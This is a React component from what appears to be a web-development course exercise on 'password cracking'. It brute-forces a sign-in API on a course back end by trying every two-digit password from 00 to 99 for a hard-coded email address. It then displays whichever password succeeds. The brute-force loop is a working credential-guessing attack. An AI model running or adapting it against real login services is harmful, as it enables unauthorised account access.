import { Box, Button, Typography } from "@mui/material";
import { useState } from "react";


const userEmail = "alesyad@mail.com";

async function handleSubmit(password, email, setText){
    const response = await fetch(
        'https://tms-js-pro-back-end.herokuapp.com/api/users/signin',
        {
        method: 'POST',
        headers: {
            Accept: 'application/json',
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
        },
    );
    if(response.ok){
        setText(password)
    }
}

function hack(setText){
    for(let i = 0; i < 100; i++){
        const userPassword = String(i).padStart(2, "0");
        handleSubmit(userPassword, userEmail, setText) 
    }
}

export default function PasswordCracking(){
    const [text, setText] = useState('what is the password?')
    return (
        <Box mt={15} display="flex" flexDirection="column" alignItems="center">
            <Typography 
            fontSize="30px" 
            > 
            The third task with password cracking (alesyad@mail.com)
            </Typography>
            <Button sx={{marginTop: "20px"}} variant="contained"  size="large" onClick={() => {
                hack(setText)
                setText("Loading...")
            }}>
            {text}
            </Button>
        </Box>
    )
}